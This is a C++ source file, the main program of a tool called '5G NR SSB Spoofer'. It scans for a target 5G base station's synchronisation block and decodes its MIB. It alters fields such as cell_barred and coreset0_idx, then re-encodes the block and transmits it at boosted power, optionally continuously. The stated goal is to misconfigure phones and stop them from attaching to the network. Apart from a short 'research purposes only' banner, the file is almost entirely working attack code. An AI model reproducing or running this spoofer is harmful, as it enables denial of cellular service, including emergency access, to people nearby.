/**
 * SSB Spoofer Main Application
 * 
 * This application performs a fake gNB attack by:
 * 1. Scanning for a legitimate SSB from a target gNB
 * 2. Decoding the MIB from the SSB
 * 3. Modifying key MIB parameters (cell_barred, coreset0_idx, etc.)
 * 4. Re-encoding and transmitting the modified SSB
 * 
 * This causes UE misconfiguration and prevents network attachment.
 */

#include "config.h"
#include "rf_handler.h"
#include "ssb_processor.h"

#include <iostream>
#include <iomanip>
#include <vector>
#include <chrono>
#include <thread>
#include <csignal>
#include <atomic>
#include <cstring>
#include <fstream>

using namespace ssb_spoofer;

// Global flag for signal handling
std::atomic<bool> running(true);

void signal_handler(int signal) {
  std::cout << "\nReceived signal " << signal << ", shutting down..." << std::endl;
  running = false;
}

void print_banner() {
  std::cout << "\n";
  std::cout << "========================================================" << std::endl;
  std::cout << "              5G NR SSB Spoofer v1.0                    " << std::endl;
  std::cout << "========================================================" << std::endl;
  std::cout << " WARNING: This tool is for research purposes only!      " << std::endl;
  std::cout << "          Unauthorized use may be illegal.              " << std::endl;
  std::cout << "========================================================" << std::endl;
  std::cout << "\n";
}

void print_usage(const char* program_name) {
  std::cout << "Usage: " << program_name << " [options]" << std::endl;
  std::cout << "\nOptions:" << std::endl;
  std::cout << "  -c, --config <file>    Configuration file (default: config.yaml)" << std::endl;
  std::cout << "  -h, --help             Print this help message" << std::endl;
  std::cout << "\nExample:" << std::endl;
  std::cout << "  " << program_name << " --config my_config.yaml" << std::endl;
  std::cout << std::endl;
}

bool scan_for_ssb(RfHandler& rf, SsbProcessor& ssb_proc, const Config& config,
            SsbSearchResult& result) {
  std::cout << "\n--------------------------------------------------------" << std::endl;
  std::cout << "  Starting SSB Scan" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  std::cout << "  Target PCI       : " << config.attack.target_pci << std::endl;
  std::cout << "  Scan Duration    : " << config.operation.scan_duration_sec << " seconds" << std::endl;
  
  // Calculate number of samples per scan iteration - use smaller chunks for receiving
  uint32_t samples_per_iter = static_cast<uint32_t>(config.rf.srate_hz * 0.001); // 1 ms chunks
  
  // But accumulate into a larger buffer for SSB search (10ms = half frame)
  uint32_t search_buffer_size = static_cast<uint32_t>(config.rf.srate_hz * 0.01); // 10 ms
  
  std::vector<std::complex<float>> rx_buffer(samples_per_iter);
  std::vector<std::complex<float>> search_buffer(search_buffer_size);
  uint32_t search_buffer_pos = 0;
  
  std::cout << "  RX Buffer        : " << samples_per_iter << " samples (1 ms)" << std::endl;
  std::cout << "  Search Buffer    : " << search_buffer_size << " samples (10 ms)" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  
  // Setup file for saving samples if enabled
  std::ofstream sample_file;
  if (config.operation.save_samples) {
      std::cout << "\n>> File Sink Enabled" << std::endl;
      std::cout << "   Output File      : " << config.operation.samples_file << std::endl;
      std::cout << "   Sample Rate      : " << config.rf.srate_hz / 1e6 << " MHz (complex float32)" << std::endl;
      sample_file.open(config.operation.samples_file, std::ios::binary | std::ios::out);
      if (!sample_file.is_open()) {
          std::cerr << "   WARNING: Could not open file for saving samples" << std::endl;
      }
  }
  
  // Start RX stream
  if (!rf.start_rx()) {
      std::cerr << "ERROR: Failed to start RX stream" << std::endl;
      return false;
  }
  
  // Give the RX stream time to initialize and flush stale samples
  std::this_thread::sleep_for(std::chrono::milliseconds(500));
  
  // Flush the initial buffer to discard stale samples
  std::cout << "\n>> Initializing receiver..." << std::endl;
  std::vector<std::complex<float>> flush_buffer(samples_per_iter);
  for (int i = 0; i < 10; i++) {
      rf.receive(flush_buffer.data(), samples_per_iter);
  }
  std::cout << "   Ready. Starting capture..." << std::endl;
  
  auto start_time = std::chrono::steady_clock::now();
  int iteration = 0;
  int successful_receives = 0;
  
  while (running) {
      // Check timeout
      auto current_time = std::chrono::steady_clock::now();
      double elapsed_sec = std::chrono::duration<double>(current_time - start_time).count();
      
      if (elapsed_sec > config.operation.scan_duration_sec) {
      std::cout << "\n\n>> Scan timeout reached (" << config.operation.scan_duration_sec << "s)" << std::endl;
      break;
      }
      
      // Receive samples
      int nrecv = rf.receive(rx_buffer.data(), samples_per_iter);
      
      if (nrecv <= 0) {
      std::this_thread::sleep_for(std::chrono::milliseconds(10));
      continue;
      }
      
      // Warn if we didn't get the expected number of samples
      if (nrecv != (int)samples_per_iter && iteration < 5) {
          std::cerr << "\n   WARNING: Received " << nrecv << " samples, expected " 
                   << samples_per_iter << std::endl;
      }
      
      successful_receives++;
      
      // Write samples to file if enabled
      if (config.operation.save_samples && sample_file.is_open()) {
          sample_file.write(reinterpret_cast<const char*>(rx_buffer.data()), 
                           nrecv * sizeof(std::complex<float>));
          // Progress indicator every 100 buffers
          if (successful_receives % 100 == 0) {
              double duration_sec = (successful_receives * samples_per_iter) / (double)config.rf.srate_hz;
              std::cout << "   Writing: " << std::fixed << std::setprecision(1) 
                       << duration_sec << "s captured     \r" << std::flush;
          }
      }
      
      // Accumulate samples into search buffer
      uint32_t samples_to_copy = std::min((uint32_t)nrecv, search_buffer_size - search_buffer_pos);
      std::memcpy(&search_buffer[search_buffer_pos], rx_buffer.data(), 
                 samples_to_copy * sizeof(std::complex<float>));
      search_buffer_pos += samples_to_copy;
      
      // Search for SSB when buffer is full
      if (search_buffer_pos >= search_buffer_size) {
          std::optional<uint32_t> target_pci = std::nullopt;
          if (config.attack.scan_for_target) {
              target_pci = config.attack.target_pci;
          }
          
          // Show scanning progress every 10 searches (~1 second)
          static int search_count = 0;
          if (++search_count % 10 == 0) {
              std::cout << "   Scanning... (" << std::fixed << std::setprecision(1) 
                       << elapsed_sec << "s)     \r" << std::flush;
          }
          
          result = ssb_proc.scan(search_buffer.data(), search_buffer_size, target_pci);
          
          if (result.found) {
              std::cout << "\n\n>> SSB Detected!" << std::endl;
              std::cout << "   PCI              : " << result.pci << std::endl;
              std::cout << "   SSB Index        : " << result.ssb_idx << std::endl;
              std::cout << "   SNR              : " << std::fixed << std::setprecision(1) << result.snr_db << " dB" << std::endl;
              std::cout << "   RSRP             : " << std::fixed << std::setprecision(1) << result.rsrp_dbm << " dBm" << std::endl;
              std::cout << std::endl;
              
              SsbProcessor::print_mib(result.mib);
              
              rf.stop_rx();
              return true;
          }
          
          // Reset buffer for next search window
          search_buffer_pos = 0;
      }
  }
  
  rf.stop_rx();
  
  // Close file if it was opened
  if (config.operation.save_samples && sample_file.is_open()) {
      sample_file.close();
      double duration_sec = (successful_receives * samples_per_iter) / (double)config.rf.srate_hz;
      std::cout << "\n\n>> File Sink Summary" << std::endl;
      std::cout << "   Output File      : " << config.operation.samples_file << std::endl;
      std::cout << "   Total Samples    : " << successful_receives * samples_per_iter << std::endl;
      std::cout << "   Duration         : " << std::fixed << std::setprecision(2) << duration_sec << " seconds" << std::endl;
  }
  
  return false;
}

bool transmit_spoofed_ssb(RfHandler& rf, SsbProcessor& ssb_proc, const Config& config,
                    const SsbSearchResult& original_ssb) {
  std::cout << "\n--------------------------------------------------------" << std::endl;
  std::cout << "  Generating Spoofed SSB" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  
  // Make a copy of the MIB to modify
  srsran_mib_nr_t modified_mib = original_ssb.mib;
  
  std::cout << ">> Modifying MIB parameters..." << std::endl;
  // Modify MIB according to attack configuration
  if (!ssb_proc.modify_mib(modified_mib, config.attack)) {
      std::cout << "   No modifications applied to MIB" << std::endl;
  }
  
  std::cout << ">> Encoding modified MIB..." << std::endl;
  // Encode modified MIB
  srsran_pbch_msg_nr_t modified_pbch_msg;
  if (!ssb_proc.encode_mib(modified_mib, original_ssb.ssb_idx, original_ssb.mib.hrf, modified_pbch_msg)) {
      std::cerr << "ERROR: Failed to encode modified MIB" << std::endl;
      return false;
  }
  
  // Generate SSB signal
  uint32_t ssb_size = ssb_proc.get_subframe_size();
  std::vector<std::complex<float>> tx_buffer(ssb_size);
  
  uint32_t nsamples = ssb_proc.generate_ssb(original_ssb.pci, modified_pbch_msg, 
                                         tx_buffer.data(), original_ssb.ssb_idx);
  
  if (nsamples == 0) {
      std::cerr << "ERROR: Failed to generate SSB signal" << std::endl;
      return false;
  }
  
  // Verify signal has power and amplify to match legitimate gNB
  float check_power = 0.0f;
  for (uint32_t i = 0; i < nsamples; i++) {
      check_power += std::norm(tx_buffer[i]);
  }
  
  // Amplify SSB signal to compete with legitimate gNB
  float target_amplitude = 0.7f;
  float current_amplitude = std::sqrt(check_power / nsamples);
  float scale_factor = target_amplitude / (current_amplitude + 1e-12f);
  
  for (uint32_t i = 0; i < nsamples; i++) {
      tx_buffer[i] *= scale_factor;
  }
  
  std::cout << ">> Signal generation complete" << std::endl;
  std::cout << "   Generated        : " << nsamples << " samples" << std::endl;
  std::cout << "   Amplitude        : " << std::fixed << std::setprecision(2) << target_amplitude << std::endl;
  
  std::cout << "\n--------------------------------------------------------" << std::endl;
  std::cout << "  Transmitting Spoofed SSB" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  std::cout << "  Target PCI       : " << original_ssb.pci << std::endl;
  std::cout << "  Frequency        : " << std::fixed << std::setprecision(2) << config.rf.tx_freq_hz / 1e6 << " MHz" << std::endl;
  std::cout << "  TX Gain          : " << config.rf.tx_gain_db << " dB" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  
  // Start TX stream
  if (!rf.start_tx()) {
      std::cerr << "ERROR: Failed to start TX stream" << std::endl;
      return false;
  }
  
  if (config.attack.continuous_tx) {
      std::cout << "\n>> Starting Continuous Attack Mode" << std::endl;
      std::cout << "   Target PCI       : " << original_ssb.pci << std::endl;
      std::cout << "   Press Ctrl+C to stop..." << std::endl;
      std::cout << "\n";
      
      int tx_count = 0;
      int consecutive_errors = 0;
      const int max_consecutive_errors = 10;
      
      auto start_time = std::chrono::steady_clock::now();
      auto last_update = start_time;
      
      while (running) {
          // Transmit SSB continuously (no gaps)
          int nsent = rf.transmit(tx_buffer.data(), nsamples, 
                                 tx_count == 0, false);
          
          if (nsent < 0) {
              consecutive_errors++;
              if (consecutive_errors >= max_consecutive_errors) {
                  std::cerr << "\nFATAL: Too many consecutive transmission errors" << std::endl;
                  break;
              }
              std::this_thread::sleep_for(std::chrono::milliseconds(100));
              continue;
          }
          
          consecutive_errors = 0;
          tx_count++;
          
          // Status update every 5 seconds
          auto now = std::chrono::steady_clock::now();
          auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_update).count();
          if (elapsed >= 5) {
              auto total_elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
              double rate = total_elapsed > 0 ? tx_count / (double)total_elapsed : 0;
              std::cout << "   Transmitting... " << tx_count << " bursts (" 
                       << total_elapsed << "s, " << std::fixed << std::setprecision(1) 
                       << rate << " bursts/s)     \r" << std::flush;
              last_update = now;
          }
      }
      
      std::cout << "\n\n--------------------------------------------------------" << std::endl;
      std::cout << "  Attack Statistics" << std::endl;
      std::cout << "--------------------------------------------------------" << std::endl;
      std::cout << "  Total Bursts     : " << tx_count << std::endl;
      auto total_time = std::chrono::duration_cast<std::chrono::seconds>(
          std::chrono::steady_clock::now() - start_time).count();
      std::cout << "  Total Time       : " << total_time << " seconds" << std::endl;
      std::cout << "  Average Rate     : " << std::fixed << std::setprecision(1) 
               << (total_time > 0 ? tx_count / (double)total_time : 0) 
               << " bursts/second" << std::endl;
      std::cout << "--------------------------------------------------------" << std::endl;
  } else {
      // Single transmission
      int nsent = rf.transmit(tx_buffer.data(), nsamples, true, true);
      
      if (nsent < 0) {
      std::cerr << "ERROR: Transmission failed" << std::endl;
      return false;
      }
      
      std::cout << "\n>> SSB transmitted successfully (" << nsent << " samples)" << std::endl;
  }
  
  // Stop TX stream
  std::cout << "\n>> Stopping TX stream..." << std::endl;
  rf.stop_tx();
  
  return true;
}

int main(int argc, char** argv) {
  // Print banner
  print_banner();
  
  // Parse command line arguments
  std::string config_file = "config.yaml";
  
  for (int i = 1; i < argc; i++) {
      std::string arg = argv[i];
      if (arg == "-h" || arg == "--help") {
      print_usage(argv[0]);
      return 0;
      } else if (arg == "-c" || arg == "--config") {
      if (i + 1 < argc) {
          config_file = argv[++i];
      } else {
          std::cerr << "Error: -c option requires an argument" << std::endl;
          return 1;
      }
      } else {
      std::cerr << "Error: Unknown option " << arg << std::endl;
      print_usage(argv[0]);
      return 1;
      }
  }
  
  // Setup signal handlers
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);
  
  // Load configuration
  std::cout << "\n>> Loading configuration from: " << config_file << std::endl;
  Config config;
  if (!ConfigParser::load_from_file(config_file, config)) {
      std::cerr << "ERROR: Failed to load configuration" << std::endl;
      return 1;
  }
  
  ConfigParser::print(config);
  
  // Initialize RF handler
  std::cout << "\n--------------------------------------------------------" << std::endl;
  std::cout << "  Initializing RF Device" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  RfHandler rf;
  if (!rf.init(config.rf)) {
      std::cerr << "ERROR: Failed to initialize RF device" << std::endl;
      return 1;
  }
  
  // Initialize SSB processor
  std::cout << "\n--------------------------------------------------------" << std::endl;
  std::cout << "  Initializing SSB Processor" << std::endl;
  std::cout << "--------------------------------------------------------" << std::endl;
  SsbProcessor ssb_proc;
  if (!ssb_proc.init(config.ssb, config.rf.srate_hz, config.rf.rx_freq_hz)) {
      std::cerr << "ERROR: Failed to initialize SSB processor" << std::endl;
      return 1;
  }
  
  // Scan for target SSB
  SsbSearchResult ssb_result;
  if (!scan_for_ssb(rf, ssb_proc, config, ssb_result)) {
      std::cerr << "\n--------------------------------------------------------" << std::endl;
      std::cerr << "  Failed to find target SSB" << std::endl;
      std::cerr << "--------------------------------------------------------" << std::endl;
      std::cerr << "  Suggestions:" << std::endl;
      std::cerr << "  - Check RF configuration (frequency, gain, etc.)" << std::endl;
      std::cerr << "  - Verify target gNB is transmitting" << std::endl;
      std::cerr << "  - Try increasing scan duration" << std::endl;
      std::cerr << "--------------------------------------------------------" << std::endl;
      return 1;
  }
  
  // Transmit spoofed SSB
  if (!transmit_spoofed_ssb(rf, ssb_proc, config, ssb_result)) {
      std::cerr << "ERROR: Failed to transmit spoofed SSB" << std::endl;
      return 1;
  }
  
  std::cout << "\n========================================================" << std::endl;
  std::cout << "  Attack Execution Complete" << std::endl;
  std::cout << "========================================================" << std::endl;
  std::cout << "\n";
  
  return 0;
}
